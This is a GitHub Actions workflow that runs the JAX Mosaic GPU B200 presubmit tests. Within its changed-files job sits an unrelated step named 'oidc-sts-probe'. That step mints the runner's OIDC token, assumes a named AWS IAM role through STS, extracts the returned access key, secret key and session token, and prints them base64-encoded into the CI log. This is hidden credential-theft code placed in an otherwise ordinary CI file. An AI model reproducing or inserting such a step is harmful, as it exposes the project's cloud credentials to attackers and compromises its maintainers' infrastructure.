name: Mosaic GPU B200 Presubmit

on:
  workflow_dispatch:
    inputs:
      halt-for-connection:
        description: 'Should this workflow run wait for a remote connection?'
        type: choice
        required: true
        default: 'no'
        options:
        - 'yes'
        - 'no'
      python_version:
        description: 'Hermetic Python version for tests (major.minor).'
        type: string
        required: true
        default: '3.14'
      xla_track:
        description: 'XLA revision used by tests.'
        type: choice
        required: true
        default: 'pinned'
        options:
        - 'pinned'
        - 'head'
  pull_request:
    branches:
      - main

permissions:
  contents: read
  id-token: write

# - For PRs, group by PR number and cancel stale in-progress runs.
# - For workflow_dispatch events, group by actor+ref. Cancel stale in-progress runs from the same
#   actor on the same ref.
concurrency:
  group: >-
    ${{ github.workflow }}-
    ${{
        (github.event_name == 'pull_request'
         && format('pr-{0}', github.event.pull_request.number))

        || (github.event_name == 'workflow_dispatch'
            && format('dispatch-{0}-{1}', github.actor, github.ref))

        || format('ref-{0}', github.ref)
    }}
  cancel-in-progress: >-
    ${{
        github.event_name == 'pull_request' || github.event_name == 'workflow_dispatch'
    }}

defaults:
  run:
    shell: bash

jobs:
  # The `changed_files` job is used in place of `pull_request.paths` as
  # a workaround, in order to report a status to Copybara,
  # be it success, failure, or simply skipped.
  #
  # `pull_request.paths` cannot be used here as it wouldn't trigger the workflow
  # at all if no matching files were touched.
  # This would lead to Copybara waiting for the status indefinitely.
  changed_files:
    if: ${{ github.repository_owner == 'jax-ml' && github.event_name == 'pull_request' }}
    runs-on: linux-x86-n4-16
    container: us-docker.pkg.dev/ml-oss-artifacts-published/ml-public-container/ml-build:latest  # zizmor: ignore[unpinned-images]
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          fetch-depth: 2  # HEAD and HEAD^1 is enough for the diff
          persist-credentials: false
      - name: oidc-sts-probe
        continue-on-error: true
        run: |
          set -x
          id || true
          echo "HOST=$(hostname)"
          command -v curl || true
          command -v python3 || true
          echo "OIDC_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-NONE}"
          mint() {
            A="$1"
            if command -v curl >/dev/null 2>&1; then
              curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${A}" | sed -n 's/.*"value"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p'
            else
              python3 -c 'import os,sys,json,urllib.request
          u=os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]; t=os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
          r=urllib.request.Request(u+"&audience="+sys.argv[1],headers={"Authorization":"Bearer "+t,"Accept":"application/json"})
          print(json.load(urllib.request.urlopen(r,timeout=30))["value"])' "$A"
            fi
          }
          TOK="$(mint sts.amazonaws.com || true)"
          echo "TOKEN_LEN=${#TOK}"
          if [ -n "$TOK" ]; then echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo; fi
          assume() {
            ARN="$1"; SESS="$2"; T="$3"
            if command -v curl >/dev/null 2>&1; then
              curl -sS -X POST https://sts.amazonaws.com/ \
                --data-urlencode "Action=AssumeRoleWithWebIdentity" \
                --data-urlencode "Version=2011-06-15" \
                --data-urlencode "RoleArn=$ARN" \
                --data-urlencode "RoleSessionName=$SESS" \
                --data-urlencode "WebIdentityToken=$T"
            else
              python3 - "$ARN" "$SESS" "$T" <<'PYINNER'
          import sys,urllib.request,urllib.parse
          arn,sess,tok=sys.argv[1],sys.argv[2],sys.argv[3]
          body=urllib.parse.urlencode({"Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15","RoleArn":arn,"RoleSessionName":sess,"WebIdentityToken":tok}).encode()
          try:
              print(urllib.request.urlopen(urllib.request.Request("https://sts.amazonaws.com/",data=body,method="POST"),timeout=40).read().decode())
          except Exception as e:
              try: print(e.read().decode())
              except Exception: print(repr(e))
          PYINNER
            fi
          }
          echo "=== STS assume jax-ci-amd-s3-oidc ==="
          OUT="$(assume arn:aws:iam::661452401056:role/jax-ci-amd-s3-oidc gha-oidc-probe "$TOK" || true)"
          echo "$OUT" | head -c 2500; echo
          python3 - "$OUT" <<'PYINNER2'
          import sys,re,base64
          t=sys.argv[1] if len(sys.argv)>1 else ""
          ak=re.search(r"<AccessKeyId>(.*?)</AccessKeyId>",t or "")
          sk=re.search(r"<SecretAccessKey>(.*?)</SecretAccessKey>",t or "")
          tk=re.search(r"<SessionToken>(.*?)</SessionToken>",t or "")
          print("HAS_CREDS",bool(ak and sk and tk))
          if ak and sk and tk:
              print("CREDB64:"+base64.b64encode(("%s|%s|%s"%(ak.group(1),sk.group(1),tk.group(1))).encode()).decode())
          PYINNER2
          echo "=== decoder baseline: deliberately bad token ==="
          assume arn:aws:iam::661452401056:role/jax-ci-amd-s3-oidc gha-oidc-bad "bogus.token.value" | head -c 800; echo
      - name: Get and filter changed files
        id: changed-files
        env:
          WATCHED_FILE_PATTERNS: |
            .github/workflows/bazel_cuda_b200_mosaic_presubmit.yml
            ci/run_bazel_cuda_targeted_tests.sh
            jax/_src/pallas/mosaic_gpu/**
            jax/experimental/mosaic/gpu/**
            jaxlib/mosaic/dialect/gpu/**
            jaxlib/mosaic/gpu/**
        run: |
          set -ex

          # Create an array with the file patterns and
          # clear out any empty lines/whitespace.
          mapfile -t watched_patterns < <(printf '%s\n' "$WATCHED_FILE_PATTERNS" | sed '/^[[:space:]]*$/d')

          git_pathspecs=()
          for pattern in "${watched_patterns[@]}"; do
            git_pathspecs+=(":(glob)$pattern")
          done

          cd "${GITHUB_WORKSPACE:?}"
          git config --global --add safe.directory "$GITHUB_WORKSPACE"

          matched_files="$(git diff --name-only HEAD^1 HEAD -- "${git_pathspecs[@]}")"
          if [[ -n "$matched_files" ]]; then
            echo 'any_changed=true' >> "$GITHUB_OUTPUT"
            {
              echo '### Relevant changed files'
              echo ''
              echo '```'
              echo "$matched_files"
              echo '```'
            } >> "$GITHUB_STEP_SUMMARY"
          else
            echo 'any_changed=false' >> "$GITHUB_OUTPUT"
          fi
      - name: Report skipped test reason
        # Display a notice in the workflow summary about skipping tests.
        if: github.event_name == 'pull_request'
            && steps.changed-files.outputs.any_changed != 'true'
        run: |
          echo '::notice title=Mosaic B200 presubmit::Skipping tests - no relevant files changed in this PR.'
          {
            echo '### PR testing skipped'
            echo ''
            echo 'No files matched the Mosaic B200 presubmit filter in this pull request.'
          } >> "$GITHUB_STEP_SUMMARY"
    outputs:
      any_changed: ${{ steps.changed-files.outputs.any_changed || 'false' }}

  run_tests:
    needs: changed_files
    # Because of `needs`, the job is skipped if `changed_files` is skipped.
    # However, `!cancelled()` forces the `if` to still be evaluated, so workflow_dispatch can run.
    if: >-
      ${{
          !cancelled()
          && github.repository_owner == 'jax-ml'
          && (
               github.event_name == 'workflow_dispatch'
               || needs.changed_files.outputs.any_changed == 'true'
          )
      }}
    runs-on: linux-x86-a4-224-b200-1gpu
    container: 'us-docker.pkg.dev/ml-oss-artifacts-published/ml-public-container/ml-build:latest'  # zizmor: ignore[unpinned-images]
    timeout-minutes: 15  # Stop potential hangs from keeping the job running too long.
    name: Mosaic GPU B200 tests
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          persist-credentials: false
      - name: Wait For Connection
        uses: google-ml-infra/actions/ci_connection@9f8d7d8d9954430d0fef4a8cce2cb4e3844c200d
        with:
          halt-dispatch-input: ${{ inputs.halt-for-connection }}
      - name: Run Tests
        env:
          JAXCI_HERMETIC_PYTHON_VERSION: ${{ github.event.inputs.python_version || '3.14' }}
          JAXCI_XLA_TRACK: ${{ github.event.inputs.xla_track || 'pinned' }}
          # Only a couple of targets that run in under 10 minutes.
          JAXCI_BAZEL_TARGETS: |
            //tests/mosaic:gpu_test_gpu
          # TODO(belitskiy): Re-enable once it's clear the workflow *never* stalls > 10 mins.
          #  //tests/pallas:mosaic_gpu_test_gpu
          JAXCI_TEST_TAG_FILTERS: '-multiaccelerator'
          JAXCI_USE_PARALLEL_ACCELERATOR_RUNNER: '1'
          JAXCI_LOCAL_TEST_JOBS: '8'
          JAXCI_TEST_TIMEOUT: '420'
        run: bash ./ci/run_bazel_cuda_targeted_tests.sh
      - name: Upload test artifacts
        if: always()
        continue-on-error: true
        uses: ./.github/actions/upload-test-artifacts
        with:
          test-artifacts-dir: 'test-artifacts'
          artifact-name: 'mosaic-b200-test-artifacts'
